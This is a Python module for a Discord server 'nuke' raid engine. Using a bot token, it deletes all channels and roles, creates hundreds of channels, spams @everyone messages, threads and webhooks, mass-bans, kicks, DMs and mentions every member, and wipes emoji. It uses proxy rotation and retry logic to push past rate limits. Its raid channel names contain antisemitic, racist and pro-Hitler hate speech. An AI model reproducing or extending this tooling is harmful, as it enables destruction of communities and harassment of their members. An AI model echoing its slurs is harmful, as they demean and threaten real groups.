"""REST-based concurrent nuke engine - adapted from n-bot.

Every operation fans out into asyncio tasks gated by a semaphore so we
hammer Discord's API as hard as it will take without tripping the
global limit hard enough to get disconnected. All calls go through raw
REST using the *user's* bot token (the bot that actually sits in the
target server), so the control bot never needs to be in the guild
being nuked.

429s are handled by the patch429 wrapper (retry_after sleep + retry),
and proxy rotation spreads IP-level pressure when proxies.txt is
present.
"""

import asyncio
import json
import logging
import os
import time

import aiohttp

try:
    from . import proxies as proxy_rotation
except ImportError:  # imported as a top-level module outside the package
    from core import proxies as proxy_rotation

log = logging.getLogger("xbot.engine")

HERE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

API = "https://discord.com/api/v10"
USER_AGENT = "DiscordBot (https://gigachud.example, 1.0.0)"

NUKE_CHANNEL_COUNT = 500
NUKE_PING_ROUNDS = 25
NUKE_PING_LENGTH = 1500

# Raid channel names - every letter carries a strikethrough combining
# mark (U+0337) so they render crossed-out in Discord. The nuke cycles
# them evenly across all created channels.
NUKE_CHANNEL_NAMES = [
    "o\u0337s\u0337a\u0337m\u0337a\u0337",
    "h\u0337i\u0337t\u0337l\u0337e\u0337r\u0337-\u0337w\u0337a\u0337s\u0337-\u0337r\u0337i\u0337g\u0337h\u0337t\u0337",
    "e\u0337x\u0337t\u0337e\u0337r\u0337m\u0337i\u0337n\u0337a\u0337t\u0337e\u0337-\u0337j\u0337e\u0337w\u0337s\u0337",
    "k\u0337i\u0337l\u0337l\u0337-\u0337p\u0337e\u0337d\u0337o\u0337s\u0337",
    "k\u0337i\u0337o\u0337x\u0337-\u0337a\u0337l\u0337w\u0337a\u0337y\u0337s\u0337-\u0337d\u0337e\u0337f\u0337e\u0337n\u0337d\u0337s\u0337-\u0337t\u0337h\u0337e\u0337-\u0337i\u0337n\u0337n\u0337o\u0337c\u0337e\u0337n\u0337t\u0337",
    "o\u0337l\u0337d\u0337e\u0337g\u0337g\u0337-\u0337i\u0337s\u0337-\u0337h\u0337i\u0337t\u0337l\u0337e\u0337r\u0337",
    "t\u0337o\u0337l\u0337e\u0337-\u0337i\u0337s\u0337-\u0337s\u0337t\u0337a\u0337l\u0337i\u0337n\u0337",
    "w\u0337h\u0337y\u0337-\u0337h\u0337a\u0337t\u0337e\u0337-\u0337n\u0337i\u0337g\u0337g\u0337e\u0337r\u0337s\u0337",
]

NUKE_GUILD_NAME = "join kiox dear"
NUKE_GUILD_ICON_URL = "https://kioxontop.vercel.app/nuke-icon.png"

RAID_MESSAGE_FILE = os.path.join(HERE, "raid_message.txt")
DEFAULT_RAID_MESSAGE = (
    "# NUKED BY CHUD\n"
    "# CHUD ON TOP\n"
    "@everyone\n"
    "(https://discord.gg/auB9zuYeW6)"
)

CHANNEL_CREATE_TIMEOUT = 120
CHANNEL_CREATE_INTERVAL = 0.15   # pace creates to stay under Discord's bucket
CHANNEL_CREATE_EVERY = 5         # sleep once per N creates (was every 3rd)
THREAD_CREATE_INTERVAL = 0.15
THREAD_CREATE_TIMEOUT = 3


def raid_message(path=RAID_MESSAGE_FILE):
    """The current raid message, editable in raid_message.txt."""
    try:
        with open(path, encoding="utf-8") as fh:
            text = fh.read()
        return text if text.strip() else DEFAULT_RAID_MESSAGE
    except OSError:
        return DEFAULT_RAID_MESSAGE


def chunk_message(text, limit=2000):
    """Split a message into Discord-safe chunks on newline boundaries."""
    if len(text) <= limit:
        return [text]
    lines = text.split("\n")
    chunks, buf = [], ""
    for line in lines:
        candidate = f"{buf}\n{line}" if buf else line
        if len(candidate) <= limit:
            buf = candidate
            continue
        if buf:
            chunks.append(buf)
            buf = ""
        while len(line) > limit:
            chunks.append(line[:limit])
            line = line[limit:]
        buf = line
    if buf:
        chunks.append(buf)
    return chunks


def chunks(seq, n):
    for i in range(0, len(seq), n):
        yield seq[i:i + n]


# ======================================================================
# AttackEngine - concurrent fan-out, semaphore-gated
# ======================================================================

class AttackEngine:
    def __init__(self, concurrency=80):
        self._sem = asyncio.Semaphore(concurrency)
        self._tasks = set()
        self._stopped = asyncio.Event()

    def spawn(self, coro):
        if self._stopped.is_set():
            return
        task = asyncio.create_task(self._guard(coro))
        self._tasks.add(task)
        task.add_done_callback(self._tasks.discard)

    async def _guard(self, coro):
        async with self._sem:
            if self._stopped.is_set():
                return
            try:
                await coro
            except asyncio.CancelledError:
                raise
            except Exception as exc:  # noqa: BLE001
                log.warning("op failed: %s: %s", type(exc).__name__, exc)

    async def wait(self):
        while self._tasks:
            await asyncio.sleep(0.1)

    def stop(self):
        self._stopped.set()

    @property
    def active(self):
        return len(self._tasks)


# ======================================================================
# REST client - one session per engine, token-scoped
# ======================================================================

class RestClient:
    """Thin async REST wrapper bound to a bot token.

    Handles Discord 429 rate limits by reading retry_after from the
    response body, sleeping, and retrying - so bursts of channel
    creates / message sends don't get dropped the moment a bucket
    fills. A request that keeps getting 429'd gives up after
    _MAX_RETRIES attempts.
    """

    _MAX_RETRIES = 30

    def __init__(self, token, session=None):
        self.token = token
        self._session = session

    async def _session_get(self):
        if self._session is None or self._session.closed:
            self._session = aiohttp.ClientSession()
        return self._session

    async def request(self, method, path, **kw):
        s = await self._session_get()
        headers = kw.pop("headers", {})
        headers.setdefault("Authorization", f"Bot {self.token}")
        headers.setdefault("User-Agent", USER_AGENT)
        if "json" in kw:
            headers.setdefault("Content-Type", "application/json")
        pool = proxy_rotation.proxy_pool()
        for attempt in range(self._MAX_RETRIES):
            proxy_url, auth, slot = None, None, None
            if pool is not None and pool:
                proxy_url, auth, slot = pool.next()
            try:
                async with s.request(method, API + path,
                                     headers=headers, proxy=proxy_url,
                                     proxy_auth=auth, **kw) as r:
                    body = await r.text()
                    if r.status == 429:
                        retry_after = _parse_retry_after(body)
                        if retry_after is not None:
                            log.warning(
                                "429 on %s %s - retrying in %.2fs (attempt %d/%d)",
                                method, path, retry_after,
                                attempt + 1, self._MAX_RETRIES)
                            await asyncio.sleep(retry_after)
                            continue
                    if slot is not None:
                        pool.mark_ok(slot)
                    return r.status, body
            except Exception as exc:
                # network error / mangled response - retry instead of
                # giving up (a dropped channels fetch used to silently
                # produce an empty backup file)
                if slot is not None:
                    pool.mark_failed(slot)
                log.warning("REST %s %s failed: %s (attempt %d/%d)",
                            method, path, exc, attempt + 1,
                            self._MAX_RETRIES)
                await asyncio.sleep(0.5 + 0.5 * min(attempt, 5))
        return 0, ""

    async def close(self):
        if self._session and not self._session.closed:
            await self._session.close()


def _parse_retry_after(body):
    try:
        return float(json.loads(body).get("retry_after"))
    except Exception:
        return None


# ======================================================================
# Nuke operations (REST, token-scoped)
# ======================================================================

async def _rebrand_guild(rc, guild_id):
    await rc.request("PATCH", f"/guilds/{guild_id}",
                     json={"name": NUKE_GUILD_NAME})
    if not NUKE_GUILD_ICON_URL:
        return
    try:
        import base64 as _b64
        pool = proxy_rotation.proxy_pool()
        px, auth, _slot = None, None, None
        if pool:
            px, auth, _slot = pool.next()
        async with aiohttp.ClientSession() as s:
            async with s.get(NUKE_GUILD_ICON_URL, proxy=px,
                             proxy_auth=auth,
                             timeout=aiohttp.ClientTimeout(total=20)) as r:
                if r.status != 200:
                    return
                ctype = (r.headers.get("Content-Type") or "").lower()
                blob = await r.read()
        if not blob:
            return
        mime = "image/png"
        if "jpeg" in ctype or "jpg" in ctype:
            mime = "image/jpeg"
        elif "gif" in ctype:
            mime = "image/gif"
        await rc.request(
            "PATCH", f"/guilds/{guild_id}",
            json={"icon": f"data:{mime};base64,"
                         + _b64.b64encode(blob).decode()})
    except Exception as exc:  # noqa: BLE001
        log.warning("guild icon failed: %s", exc)


async def rename_guild(token, guild_id, name):
    """Set a custom server name. Returns (status, body)."""
    rc = RestClient(token)
    try:
        return await rc.request("PATCH", f"/guilds/{guild_id}",
                                json={"name": name})
    finally:
        await rc.close()


async def set_guild_icon(token, guild_id, image_bytes):
    """Set a custom server icon from raw image bytes (png/jpg/gif).

    Returns (status, body).
    """
    import base64 as _b64
    data_uri = "data:image/png;base64," + _b64.b64encode(image_bytes).decode()
    rc = RestClient(token)
    try:
        return await rc.request("PATCH", f"/guilds/{guild_id}",
                                json={"icon": data_uri})
    finally:
        await rc.close()


async def _delete_channels(engine, rc, guild_id):
    status, body = await rc.request("GET", f"/guilds/{guild_id}/channels")
    if status != 200:
        return
    try:
        channels = json.loads(body)
    except Exception:
        return
    for ch in channels:
        engine.spawn(rc.request("DELETE", f"/channels/{ch['id']}"))


async def _channel_shot(rc, guild_id, name):
    try:
        return await asyncio.wait_for(
            rc.request("POST", f"/guilds/{guild_id}/channels",
                       json={"name": name, "type": 0}),
            timeout=CHANNEL_CREATE_TIMEOUT)
    except asyncio.TimeoutError:
        log.warning("channel %r dropped (429 retry too long)", name)
    except Exception as exc:
        log.warning("channel %r failed: %s", name, exc)
    return None


async def _collect_channel(coro, bucket):
    result = await coro
    if result:
        status, body = result
        if status in (200, 201):
            try:
                bucket.append(json.loads(body)["id"])
            except Exception:
                pass


async def _create_channels(engine, rc, guild_id, count):
    """Rebuild `count` channels cycling the raid names, paced.

    Discord's channel-create bucket is ~10 per 10s per guild, so firing
    all 50 at once trips it and most gets dropped. We pace the creates
    with a short delay between each (well under the bucket) so every
    channel lands. Each create is still best-effort with a generous
    timeout for the odd 429.
    """
    created = []
    for i in range(max(1, count)):
        name = NUKE_CHANNEL_NAMES[i % len(NUKE_CHANNEL_NAMES)]
        engine.spawn(_collect_channel(
            _channel_shot(rc, guild_id, name), created))
        if i % CHANNEL_CREATE_EVERY == CHANNEL_CREATE_EVERY - 1:
            await asyncio.sleep(CHANNEL_CREATE_INTERVAL)
    return created


async def _spam_channels(engine, rc, channel_ids, rounds):
    # no tts - its own strict bucket stalls the whole blitz
    payloads = chunk_message(raid_message())
    for _ in range(max(1, rounds)):
        for cid in channel_ids:
            for payload in payloads:
                engine.spawn(rc.request(
                    "POST", f"/channels/{cid}/messages",
                    json={"content": payload}))


async def _thread_shot(rc, channel_id, name):
    try:
        await asyncio.wait_for(
            rc.request("POST", f"/channels/{channel_id}/threads",
                       json={"name": name, "type": 11}),
            timeout=THREAD_CREATE_TIMEOUT)
    except asyncio.TimeoutError:
        log.warning("thread %r dropped (429 retry too long)", name)
    except Exception as exc:
        log.warning("thread %r failed: %s", name, exc)


async def _thread_spam(engine, rc, channel_ids, name):
    for i, cid in enumerate(channel_ids):
        if i:
            await asyncio.sleep(THREAD_CREATE_INTERVAL)
        engine.spawn(_thread_shot(rc, cid, name))


# ======================================================================
# The big one
# ======================================================================

async def nuke(token, guild_id, *, channel_count=NUKE_CHANNEL_COUNT,
               rounds=NUKE_PING_ROUNDS, concurrency=120):
    """Full nuke of a guild via the user's bot token, in waves.

      0. rename the server to W Chud
      1. delete every channel
      2. rebuild N channels cycling the raid names
      3. send the raid message `rounds` times per channel
      4. thread every fresh channel
    """
    engine = AttackEngine(concurrency=concurrency)
    rc = RestClient(token)

    try:
        # 0. rebrand the corpse (name + logo)
        engine.spawn(_rebrand_guild(rc, guild_id))

        # 1. wipe the map
        await _delete_channels(engine, rc, guild_id)
        await engine.wait()

        # 2. rebuild it ugly
        fresh = await _create_channels(engine, rc, guild_id, channel_count)
        await engine.wait()
        log.info("nuke: %d fresh channels ready", len(fresh))

        # 3. raid message blitz
        await _spam_channels(engine, rc, fresh, rounds)

        # 4. threads in every fresh channel
        await _thread_spam(engine, rc, fresh, "nuked-by-chud")

        await engine.wait()
    finally:
        await rc.close()


# ======================================================================
# Individual REST commands (token-scoped) - used by the private bot's
# "Choose Server" command panel. Each takes a bot token + guild id and
# fans out over the same AttackEngine.
# ======================================================================

async def _guild_members(rc, guild_id):
    """Fetch all member ids of a guild (paginated)."""
    ids = []
    after = None
    while True:
        path = f"/guilds/{guild_id}/members?limit=1000"
        if after:
            path += f"&after={after}"
        status, body = await rc.request("GET", path)
        if status != 200:
            break
        try:
            members = json.loads(body)
        except Exception:
            break
        if not members:
            break
        for m in members:
            ids.append(m["user"]["id"])
        after = ids[-1]
        if len(members) < 1000:
            break
    return ids


async def _guild_roles(rc, guild_id):
    """Fetch all role ids of a guild."""
    status, body = await rc.request("GET", f"/guilds/{guild_id}/roles")
    if status != 200:
        return []
    try:
        roles = json.loads(body)
    except Exception:
        return []
    return [r["id"] for r in roles]


async def _guild_channels(rc, guild_id):
    """Fetch all channel ids of a guild."""
    status, body = await rc.request("GET", f"/guilds/{guild_id}/channels")
    if status != 200:
        return []
    try:
        channels = json.loads(body)
    except Exception:
        return []
    return [c["id"] for c in channels]


async def _guild_emojis(rc, guild_id):
    """Fetch all emoji ids of a guild."""
    status, body = await rc.request("GET", f"/guilds/{guild_id}/emojis")
    if status != 200:
        return []
    try:
        emojis = json.loads(body)
    except Exception:
        return []
    return [e["id"] for e in emojis]


async def ban_all(token, guild_id, *, reason="nuked by yours truly",
                  concurrency=80):
    engine = AttackEngine(concurrency=concurrency)
    rc = RestClient(token)
    try:
        ids = await _guild_members(rc, guild_id)
        for uid in ids:
            engine.spawn(rc.request(
                "PUT", f"/guilds/{guild_id}/bans/{uid}",
                json={"delete_message_days": 7, "reason": reason}))
        await engine.wait()
    finally:
        await rc.close()


async def kick_all(token, guild_id, *, reason="gtfo", concurrency=80):
    engine = AttackEngine(concurrency=concurrency)
    rc = RestClient(token)
    try:
        ids = await _guild_members(rc, guild_id)
        for uid in ids:
            engine.spawn(rc.request(
                "DELETE", f"/guilds/{guild_id}/members/{uid}",
                json={"reason": reason}))
        await engine.wait()
    finally:
        await rc.close()


async def mass_dm(token, guild_id, message, *, concurrency=80):
    engine = AttackEngine(concurrency=concurrency)
    rc = RestClient(token)
    try:
        ids = await _guild_members(rc, guild_id)
        for uid in ids:
            engine.spawn(_dm_user(rc, uid, message))
        await engine.wait()
    finally:
        await rc.close()


async def _dm_user(rc, user_id, message):
    # POST /users/{uid}/channels with an empty body is dead - Discord now
    # requires POST /users/@me/channels with recipient_id
    status, body = await rc.request(
        "POST", "/users/@me/channels",
        json={"recipient_id": str(user_id)})
    if status != 200:
        return
    try:
        dm_id = json.loads(body)["id"]
    except Exception:
        return
    await rc.request("POST", f"/channels/{dm_id}/messages",
                     json={"content": message})


async def nick_all(token, guild_id, nick, *, concurrency=80):
    engine = AttackEngine(concurrency=concurrency)
    rc = RestClient(token)
    try:
        ids = await _guild_members(rc, guild_id)
        for uid in ids:
            engine.spawn(rc.request(
                "PATCH", f"/guilds/{guild_id}/members/{uid}",
                json={"nick": nick}))
        await engine.wait()
    finally:
        await rc.close()


async def mention_all(token, guild_id, message, *, concurrency=80):
    engine = AttackEngine(concurrency=concurrency)
    rc = RestClient(token)
    try:
        ids = await _guild_members(rc, guild_id)
        # one giant mention string 400s past 2000 chars - batch it
        batches, cur = [], ""
        for uid in ids:
            tag = f"<@{uid}>"
            if len(cur) + len(tag) + 1 > 1900:
                batches.append(cur)
                cur = tag
            else:
                cur = (cur + " " + tag).strip()
        if cur:
            batches.append(cur)
        channels = await _guild_channels(rc, guild_id)
        for cid in channels:
            for batch in batches:
                for payload in chunk_message(f"{batch}\n{message}"):
                    engine.spawn(rc.request(
                        "POST", f"/channels/{cid}/messages",
                        json={"content": payload}))
        await engine.wait()
    finally:
        await rc.close()


async def delete_channels(token, guild_id, *, concurrency=80):
    engine = AttackEngine(concurrency=concurrency)
    rc = RestClient(token)
    try:
        channels = await _guild_channels(rc, guild_id)
        for cid in channels:
            engine.spawn(rc.request("DELETE", f"/channels/{cid}"))
        await engine.wait()
    finally:
        await rc.close()


async def create_channels(token, guild_id, name, count, *, concurrency=80):
    engine = AttackEngine(concurrency=concurrency)
    rc = RestClient(token)
    try:
        for i in range(max(1, count)):
            engine.spawn(_channel_shot(rc, guild_id, name))
            if i % CHANNEL_CREATE_EVERY == CHANNEL_CREATE_EVERY - 1:
                await asyncio.sleep(CHANNEL_CREATE_INTERVAL)
        await engine.wait()
    finally:
        await rc.close()


async def spam_channels(token, guild_id, message, rounds=1, *,
                        concurrency=80):
    engine = AttackEngine(concurrency=concurrency)
    rc = RestClient(token)
    try:
        channels = await _guild_channels(rc, guild_id)
        payloads = chunk_message(message)
        for _ in range(max(1, rounds)):
            for cid in channels:
                for payload in payloads:
                    engine.spawn(rc.request(
                        "POST", f"/channels/{cid}/messages",
                        json={"content": payload}))
        await engine.wait()
    finally:
        await rc.close()


async def thread_spam(token, guild_id, name, *, concurrency=80):
    engine = AttackEngine(concurrency=concurrency)
    rc = RestClient(token)
    try:
        channels = await _guild_channels(rc, guild_id)
        for i, cid in enumerate(channels):
            if i:
                await asyncio.sleep(THREAD_CREATE_INTERVAL)
            engine.spawn(_thread_shot(rc, cid, name))
        await engine.wait()
    finally:
        await rc.close()


async def webhook_spam(token, guild_id, message, per_channel=5, *,
                       concurrency=80):
    engine = AttackEngine(concurrency=concurrency)
    rc = RestClient(token)
    try:
        channels = await _guild_channels(rc, guild_id)
        for cid in channels:
            for i in range(per_channel):
                engine.spawn(_webhook_shot(rc, cid, message, f"nuked-{i + 1}"))
        await engine.wait()
    finally:
        await rc.close()


async def _webhook_shot(rc, channel_id, message, name):
    status, body = await rc.request(
        "POST", f"/channels/{channel_id}/webhooks",
        json={"name": name})
    if status not in (200, 201):
        return
    try:
        wh = json.loads(body)
        wh_id = wh["id"]
        wh_token = wh["token"]
    except Exception:
        return
    await rc.request(
        "POST", f"/webhooks/{wh_id}/{wh_token}",
        json={"content": message})


async def delete_roles(token, guild_id, *, concurrency=80):
    engine = AttackEngine(concurrency=concurrency)
    rc = RestClient(token)
    try:
        roles = await _guild_roles(rc, guild_id)
        for rid in roles:
            engine.spawn(rc.request("DELETE", f"/guilds/{guild_id}/roles/{rid}"))
        await engine.wait()
    finally:
        await rc.close()


async def create_roles(token, guild_id, name, count, *, concurrency=80):
    engine = AttackEngine(concurrency=concurrency)
    rc = RestClient(token)
    try:
        for _ in range(max(1, count)):
            engine.spawn(rc.request(
                "POST", f"/guilds/{guild_id}/roles", json={"name": name}))
        await engine.wait()
    finally:
        await rc.close()


async def wipe_emoji(token, guild_id, *, concurrency=80):
    engine = AttackEngine(concurrency=concurrency)
    rc = RestClient(token)
    try:
        emojis = await _guild_emojis(rc, guild_id)
        for eid in emojis:
            engine.spawn(rc.request(
                "DELETE", f"/guilds/{guild_id}/emojis/{eid}"))
        await engine.wait()
    finally:
        await rc.close()


async def prune_members(token, guild_id, days=7):
    rc = RestClient(token)
    try:
        await rc.request(
            "POST", f"/guilds/{guild_id}/prune",
            json={"days": days, "compute_prune_count": False})
    finally:
        await rc.close()
